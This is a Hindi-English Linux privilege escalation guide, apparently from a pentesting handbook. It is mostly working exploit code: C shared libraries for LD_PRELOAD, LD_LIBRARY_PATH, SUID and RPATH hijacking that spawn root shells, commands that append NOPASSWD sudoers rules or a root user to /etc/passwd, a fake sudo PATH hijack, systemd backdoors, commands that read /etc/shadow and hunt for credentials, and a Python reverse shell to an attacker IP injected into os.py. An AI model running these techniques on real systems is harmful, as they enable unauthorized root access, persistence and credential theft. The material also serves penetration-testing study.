Privilege escalation तब हो सकती है यदि आपके पास `sudo` के साथ commands execute करने की क्षमता है और `sudo -l` का output में **env_keep+=LD_PRELOAD** statement शामिल है। यह configuration **LD_PRELOAD** environment variable को persist रहने देती है और `sudo` के साथ commands run होने पर भी recognized रहने देती है, जिससे elevated privileges के साथ arbitrary code execute होने का potential बनता है।
```
Defaults        env_keep += LD_PRELOAD
```
Save as **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
फिर इसे **compile** करें using:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
अंततः, **escalate privileges** चलाएँ
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> एक समान privesc का दुरुपयोग किया जा सकता है अगर attacker **LD_LIBRARY_PATH** env variable को control करता है, क्योंकि वह उस path को control करता है जहाँ libraries को search किया जाएगा।
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

जब कोई binary **SUID** permissions के साथ मिलती है जो असामान्य लगती है, तो यह जांचना अच्छा अभ्यास है कि क्या वह **.so** files को सही तरीके से load कर रही है। इसे निम्न command चलाकर जांचा जा सकता है:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
उदाहरण के लिए, इस तरह की error का सामना करना _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ exploitation की संभावना का संकेत देता है।

इसे exploit करने के लिए, आप एक C file बनाएंगे, जैसे _"/path/to/.config/libcalc.c"_, जिसमें निम्न code होगा:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
यह code, एक बार compile और execute होने पर, file permissions को manipulate करके और elevated privileges के साथ shell execute करके privileges को elevate करने का लक्ष्य रखता है।

ऊपर दिए गए C file को एक shared object (.so) file में compile करें with:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
अंत में, प्रभावित SUID binary को चलाने से exploit ट्रिगर होना चाहिए, जिससे संभावित रूप से system compromise हो सकता है।

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
अब जब हमें एक SUID binary मिल गई है जो एक library को ऐसे folder से load कर रही है जहाँ हम write कर सकते हैं, तो चलिए उसी folder में ज़रूरी name वाली library बनाते हैं:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
यदि आपको ऐसा error मिले जैसे
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) एक curated list है Unix binaries की जिन्हें एक attacker local security restrictions bypass करने के लिए exploit कर सकता है। [**GTFOArgs**](https://gtfoargs.github.io/) वही है, लेकिन उन cases के लिए जहां आप किसी command में **only inject arguments** कर सकते हैं।

The project Unix binaries के legitimate functions collect करता है जिन्हें abuse करके restricted shells से बाहर निकला जा सकता है, privileges escalate या maintain किए जा सकते हैं, files transfer की जा सकती हैं, bind और reverse shells spawn किए जा सकते हैं, और बाकी post-exploitation tasks facilitate किए जा सकते हैं।

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

अगर आप `sudo -l` access कर सकते हैं, तो आप tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) का उपयोग करके check कर सकते हैं कि क्या यह किसी sudo rule को exploit करने का तरीका ढूंढता है।

### Reusing Sudo Tokens

अगर आपके पास **sudo access** है लेकिन password नहीं है, तो आप privileges escalate कर सकते हैं by **waiting for a sudo command execution and then hijacking the session token**.

Requirements to escalate privileges:

- आपके पास पहले से user "_sampleuser_" के रूप में एक shell हो
- "_sampleuser_" ने पिछले **15mins** में कुछ execute करने के लिए **sudo का उपयोग** किया हो (default रूप से यही sudo token की duration होती है, जो हमें password दिए बिना `sudo` use करने देती है)
- `cat /proc/sys/kernel/yama/ptrace_scope` 0 हो
- `gdb` accessible हो (आप इसे upload कर सकें)

(आप temporarily `ptrace_scope` को `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` से enable कर सकते हैं या `/etc/sysctl.d/10-ptrace.conf` को permanently modify करके `kernel.yama.ptrace_scope = 0` set कर सकते हैं)

अगर ये सभी requirements met हों, तो आप privileges escalate करने के लिए यह use कर सकते हैं: [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **first exploit** (`exploit.sh`) `/tmp` में binary `activate_sudo_token` create करेगा। आप इसका use करके अपनी session में **sudo token activate** कर सकते हैं (आपको automatically root shell नहीं मिलेगा, `sudo su` करें):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **दूसरा exploit** (`exploit_v2.sh`) _/tmp_ में एक sh shell बनाएगा जो **root के स्वामित्व में होगा और setuid के साथ होगा**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **तीसरा exploit** (`exploit_v3.sh`) एक **sudoers file** बनाएगा जो **sudo tokens को eternal बना देगा और सभी users को sudo use करने की अनुमति देगा**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

यदि आपके पास फोल्डर में या फोल्डर के अंदर बनाई गई किसी भी file पर **write permissions** हैं, तो आप binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) का उपयोग करके किसी user और PID के लिए **sudo token create** कर सकते हैं।\
उदाहरण के लिए, यदि आप file _/var/run/sudo/ts/sampleuser_ को overwrite कर सकते हैं और आपके पास उस user के रूप में PID 1234 के साथ shell है, तो आप password जाने बिना **sudo privileges** प्राप्त कर सकते हैं, ऐसा करके:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

फ़ाइल `/etc/sudoers` और `/etc/sudoers.d` के अंदर की फ़ाइलें यह कॉन्फ़िगर करती हैं कि कौन `sudo` का उपयोग कर सकता है और कैसे। ये फ़ाइलें **default रूप से केवल user root और group root द्वारा read की जा सकती हैं**।\
**यदि** आप इस फ़ाइल को **read** कर सकते हैं, तो आप **कुछ रोचक जानकारी प्राप्त** कर सकते हैं, और यदि आप कोई भी फ़ाइल **write** कर सकते हैं, तो आप **privileges escalate** कर पाएँगे।
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
यदि आप लिख सकते हैं, तो आप इस permission का abuse कर सकते हैं
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
इन अनुमतियों का दुरुपयोग करने का एक और तरीका:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` बाइनरी के कुछ विकल्प हैं, जैसे OpenBSD के लिए `doas`; इसकी configuration `/etc/doas.conf` पर check करना याद रखें
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

यदि आप जानते हैं कि कोई **user आमतौर पर machine से connect करता है और privileges escalate करने के लिए `sudo` का उपयोग करता है**, और आपको उस user context में shell मिल गई है, तो आप एक **new sudo executable** बना सकते हैं जो पहले आपका code root के रूप में execute करेगा और फिर user का command चलाएगा। फिर, user context के **$PATH** को **modify** करें (उदाहरण के लिए .bash_profile में नया path जोड़कर) ताकि जब user `sudo` execute करे, तो आपका sudo executable execute हो।

ध्यान दें कि अगर user कोई अलग shell (bash नहीं) उपयोग करता है, तो आपको नया path जोड़ने के लिए अन्य files modify करनी होंगी। उदाहरण के लिए[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` को modify करता है। आप एक और example [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) में पा सकते हैं

या कुछ इस तरह चलाएँ:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

फ़ाइल `/etc/ld.so.conf` यह बताती है कि **लोड की गई configuration files कहाँ से आती हैं**। आम तौर पर, इस फ़ाइल में निम्न path होता है: `include /etc/ld.so.conf.d/*.conf`

इसका मतलब है कि `/etc/ld.so.conf.d/*.conf` से आने वाली configuration files पढ़ी जाएँगी। ये configuration files **अन्य folders की ओर points करती हैं** जहाँ **libraries** को **search** किया जाएगा। उदाहरण के लिए, `/etc/ld.so.conf.d/libc.conf` की content `/usr/local/lib` है। **इसका मतलब है कि system `/usr/local/lib` के अंदर libraries search करेगा**।

अगर किसी कारण से **किसी user के पास** इन में से किसी भी indicated path पर write permissions हैं: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` के अंदर कोई भी file, या `/etc/ld.so.conf.d/*.conf` के अंदर config file में कोई भी folder, तो वह privileges escalate कर सकता है।\
**इस misconfiguration exploit कैसे करें** यह देखने के लिए निम्न page देखें:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
`/var/tmp/flag15/` में lib को कॉपी करके, इसे इस जगह पर प्रोग्राम द्वारा `RPATH` variable में निर्दिष्ट अनुसार उपयोग किया जाएगा।
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Then `/var/tmp` में `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` के साथ एक evil library बनाएं
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities एक process को उपलब्ध root privileges का **subset** प्रदान करती हैं। इससे root **privileges छोटे और अलग-अलग units** में effectively बंट जाते हैं। इनमें से हर unit को independently processes को दिया जा सकता है। इस तरह privileges का full set कम हो जाता है, जिससे exploitation का risk घटता है।\
Capabilities के बारे में और जानने और उनका abuse कैसे करना है, यह जानने के लिए निम्न page पढ़ें:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

किसी directory में, **"execute"** bit का मतलब है कि affected user उस folder में "**cd**" कर सकता है।\
**"read"** bit का मतलब है कि user **files** को **list** कर सकता है, और **"write"** bit का मतलब है कि user **files** को **delete** और **create** कर सकता है।

## ACLs

Access Control Lists (ACLs) discretionary permissions की secondary layer को represent करती हैं, जो **traditional ugo/rwx permissions को override** करने में सक्षम हैं। ये permissions, specific users जो owner नहीं हैं या group का हिस्सा नहीं हैं, उनके लिए rights allow या deny करके file या directory access पर control बढ़ाती हैं। यह **granularity** level access management को अधिक precise बनाता है। और विवरण [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux) में मिल सकते हैं।

"user" "kali" को किसी file पर read और write permissions **Give** करें:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**सिस्टम से विशिष्ट ACLs वाली** files प्राप्त करें:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### sudoers drop-ins पर छिपा ACL backdoor

एक आम misconfiguration यह है कि `/etc/sudoers.d/` में root-owned file mode `440` के साथ हो, लेकिन फिर भी ACL के जरिए low-priv user को write access मिल जाए।
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
यदि आप `user:alice:rw-` जैसा कुछ देखते हैं, तो user प्रतिबंधात्मक mode bits के बावजूद एक sudo rule जोड़ सकता है:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
यह एक high-impact ACL persistence/privesc path है क्योंकि यह `ls -l`-only reviews में आसानी से छूट सकता है।

## Open shell sessions

**old versions** में आप किसी अलग user (**root**) के कुछ **shell** session को **hijack** कर सकते हैं।\
**newest versions** में आप केवल अपने ही user की screen sessions से **connect** कर पाएंगे। हालांकि, आपको session के अंदर **interesting information** मिल सकती है।

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**एक session से attach करें**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

यह **old tmux versions** के साथ एक समस्या थी। मैं root द्वारा बनाई गई tmux (v2.1) session को non-privileged user के रूप में hijack नहीं कर सका।

**List tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**एक session से attach करें**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Debian based systems (Ubuntu, Kubuntu, etc) पर September 2006 और May 13th, 2008 के बीच generated सभी SSL और SSH keys इस bug से affected हो सकते हैं.\
यह bug तब caused होता है जब उन OS में एक नया ssh key create किया जाता है, क्योंकि **सिर्फ 32,768 variations possible थीं**. इसका मतलब है कि सभी possibilities calculate की जा सकती हैं और **ssh public key होने पर आप corresponding private key search कर सकते हैं**. Calculated possibilities आप यहां find कर सकते हैं: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Specifies whether password authentication is allowed. The default is `no`.
- **PubkeyAuthentication:** Specifies whether public key authentication is allowed. The default is `yes`.
- **PermitEmptyPasswords**: When password authentication is allowed, it specifies whether the server allows login to accounts with empty password strings. The default is `no`.

### Login control files

ये files यह influence करती हैं कि कौन log in कर सकता है और कैसे:

- **`/etc/nologin`**: अगर present हो, तो non-root logins block करता है और अपना message print करता है।
- **`/etc/securetty`**: restricts करता है कि root कहाँ से log in कर सकता है (TTY allowlist)।
- **`/etc/motd`**: post-login banner (can leak environment or maintenance details).

### PermitRootLogin

यह specify करता है कि root ssh का उपयोग करके log in कर सकता है या नहीं, default `no` है। Possible values:

- `yes`: root password और private key दोनों से login कर सकता है
- `without-password` or `prohibit-password`: root केवल private key के साथ login कर सकता है
- `forced-commands-only`: Root केवल private key का उपयोग करके और अगर commands options specified हों तभी login कर सकता है
- `no` : no

### AuthorizedKeysFile

यह उन files को specify करता है जिनमें public keys होती हैं जिन्हें user authentication के लिए use किया जा सकता है। इसमें `%h` जैसे tokens हो सकते हैं, जिन्हें home directory से replace किया जाएगा। **आप absolute paths** (जो `/` से शुरू होते हैं) **या relative paths from the user's home** indicate कर सकते हैं। उदाहरण के लिए:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
यह configuration यह संकेत देगी कि यदि आप user "**testusername**" की **private** key से login करने की कोशिश करते हैं, तो ssh आपकी key की public key की तुलना `/home/testusername/.ssh/authorized_keys` और `/home/testusername/access` में स्थित keys से करेगा

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding आपको **अपनी local SSH keys का उपयोग** करने देता है, बजाय keys को server पर पड़े रहने देने के (**without passphrases!**)। इसलिए, आप ssh के माध्यम से **एक host तक jump** कर सकेंगे और वहाँ से **किसी दूसरे** host तक **jump** कर सकेंगे, **using** अपने **initial host** में स्थित **key** का।

आपको यह option `$HOME/.ssh.config` में इस तरह set करना होगा:
```
Host example.com
ForwardAgent yes
```
ध्यान दें कि यदि `Host` `*` है, तो हर बार जब उपयोगकर्ता किसी अलग मशीन पर जाता है, वह host keys तक पहुँच सकता है (जो एक सुरक्षा issue है)।

फाइल `/etc/ssh_config` इस **options** को **override** कर सकती है और इस configuration को allow या denied कर सकती है।\
फाइल `/etc/sshd_config` keyword `AllowAgentForwarding` (default is allow) के साथ ssh-agent forwarding को **allow** या **denied** कर सकती है।

यदि आपको किसी environment में Forward Agent configured मिला है, तो निम्न page पढ़ें क्योंकि **आप privileges को escalate करने के लिए इसका abuse कर सकते हैं**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interesting Files

### Profiles files

फाइल `/etc/profile` और `/etc/profile.d/` के अंदर की फाइलें **scripts हैं जो तब execute होती हैं जब कोई user नया shell चलाता है**। इसलिए, यदि आप इनमें से किसी भी file को **write या modify** कर सकते हैं, तो आप privileges को escalate कर सकते हैं।
```bash
ls -l /etc/profile /etc/profile.d/
```
यदि कोई अजीब profile script मिलती है, तो आपको उसमें **संवेदनशील विवरण** की जांच करनी चाहिए।

### Passwd/Shadow Files

OS पर निर्भर करते हुए `/etc/passwd` और `/etc/shadow` files का नाम अलग हो सकता है या उनका backup मौजूद हो सकता है। इसलिए यह recommended है कि **इन सभी को ढूंढें** और **जांचें कि क्या आप उन्हें पढ़ सकते हैं** ताकि देखें **क्या files के अंदर hashes हैं**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
कभी-कभी आप `/etc/passwd` (या उसके समकक्ष) फ़ाइल के अंदर **password hashes** पा सकते हैं
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

सबसे पहले, निम्नलिखित कमांड्स में से किसी एक के साथ एक password generate करें।
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
फिर user `hacker` जोड़ें और generated password जोड़ें।
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
उदाहरण: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

अब आप `hacker:hacker` के साथ `su` कमांड का उपयोग कर सकते हैं

वैकल्पिक रूप से, आप बिना पासवर्ड वाला dummy user जोड़ने के लिए निम्नलिखित lines का उपयोग कर सकते हैं.\
WARNING: आप machine की current security को कमज़ोर कर सकते हैं।
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
नोट: BSD प्लेटफ़ॉर्म पर `/etc/passwd` `/etc/pwd.db` और `/etc/master.passwd` पर स्थित होता है, और `/etc/shadow` का नाम बदलकर `/etc/spwd.db` कर दिया जाता है।

आपको यह जाँचना चाहिए कि क्या आप **कुछ संवेदनशील फ़ाइलों में लिख** सकते हैं। उदाहरण के लिए, क्या आप किसी **service configuration file** में लिख सकते हैं?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
उदाहरण के लिए, यदि मशीन पर एक **tomcat** server चल रहा है और आप **/etc/systemd/ के अंदर Tomcat service configuration file को modify** कर सकते हैं, तो आप lines को modify कर सकते हैं:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
आपका backdoor अगली बार जब tomcat start होगा तब execute किया जाएगा।

### Check Folders

निम्नलिखित folders में backups या interesting information हो सकती है: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (संभवतः आप आखिरी वाला पढ़ नहीं पाएँगे, लेकिन try करें)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### अजीब स्थान/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### अंतिम कुछ मिनटों में संशोधित फ़ाइलें
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB फ़ाइलें
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml फ़ाइलें
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### छिपी हुई फ़ाइलें
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH में Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **वेब फाइल्स**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **बैकअप**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Known files containing passwords

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) का code पढ़ें, यह **कई संभावित files** खोजता है जिनमें passwords हो सकते हैं।\
**एक और interesting tool** जो आप इसके लिए उपयोग कर सकते हैं, वह है: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), जो Windows, Linux & Mac पर local computer में stored बहुत सारे passwords को retrieve करने के लिए इस्तेमाल होने वाला open source application है।

### Logs

अगर आप logs पढ़ सकते हैं, तो उनमें **interesting/confidential information** मिल सकती है। Log जितना अजीब होगा, उतना ही interesting होने की संभावना होगी (शायद)।\
साथ ही, कुछ "**bad**" configured (backdoored?) **audit logs** आपको audit logs के अंदर passwords **record** करने की अनुमति दे सकते हैं, जैसा कि इस post में समझाया गया है: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
लॉग्स पढ़ने के लिए **adm** समूह [**adm**](interesting-groups-linux-pe/index.html#adm-group) वास्तव में बहुत मददगार होगा।

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

आपको ऐसे files भी check करने चाहिए जिनके **name** में या **content** के अंदर "**password**" शब्द हो, और logs के अंदर IPs और emails भी check करने चाहिए, साथ ही hashes regexps भी।\
मैं यहाँ यह नहीं बताने वाला कि यह सब कैसे करना है, लेकिन अगर आप interested हैं तो आप last checks देख सकते हैं जो [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) perform करता है।

## Writable files

### Python library hijacking

अगर आपको पता है कि कोई python script **कहाँ से** execute होने वाली है और आप उस folder के अंदर **write** कर सकते हैं या आप python libraries **modify** कर सकते हैं, तो आप OS library को modify करके उसे backdoor कर सकते हैं (अगर आप वहाँ write कर सकते हैं जहाँ python script execute होने वाली है, तो os.py library को copy और paste करें)।

**library को backdoor** करने के लिए बस os.py library के end में निम्न line जोड़ें (IP और PORT बदलें):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate` में एक vulnerability, जिन users के पास किसी log file या उसकी parent directories पर **write permissions** हैं, उन्हें privilege escalation का मौका दे सकती है। ऐसा इसलिए है क्योंकि `logrotate`, जो अक्सर **root** के रूप में चलता है, उसे arbitrary files execute करने के लिए manipulate किया जा सकता है, खासकर _**/etc/bash_completion.d/**_ जैसी directories में। यह ज़रूरी है कि permissions सिर्फ _/var/log_ में नहीं, बल्कि उन सभी directories में भी check की जाएँ जहाँ log rotation लागू होती है।

> [!TIP]
> यह vulnerability `logrotate` version `3.18.0` और उससे पुराने versions को affect करती है

इस vulnerability के बारे में अधिक विस्तृत जानकारी इस page पर मिल सकती है: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

आप इस vulnerability का exploit [**logrotten**](https://github.com/whotwagner/logrotten) से कर सकते हैं।

यह vulnerability [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** के बहुत समान है, इसलिए जब भी आपको पता चले कि आप logs को alter कर सकते हैं, तो यह check करें कि उन्हें कौन manage कर रहा है और देखें कि क्या आप symlinks से logs को replace करके privileges escalate कर सकते हैं।

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

यदि किसी भी कारण से कोई user _/etc/sysconfig/network-scripts_ में एक `ifcf-<whatever>` script **write** कर सकता है **या** किसी existing script को **adjust** कर सकता है, तो आपका **system pwned** है।

Network scripts, उदाहरण के लिए _ifcg-eth0_, network connections के लिए इस्तेमाल होते हैं। वे बिल्कुल .INI files जैसे दिखते हैं। हालांकि, Linux पर उन्हें Network Manager (dispatcher.d) द्वारा \~sourced\~ किया जाता है।

मेरे case में, इन network scripts में `NAME=` attribute सही तरीके से handle नहीं होता। अगर name में **white/blank space** है, तो system white/blank space के बाद वाले हिस्से को execute करने की कोशिश करता है। इसका मतलब है कि **पहले blank space के बाद का सब कुछ root के रूप में execute होता है**।

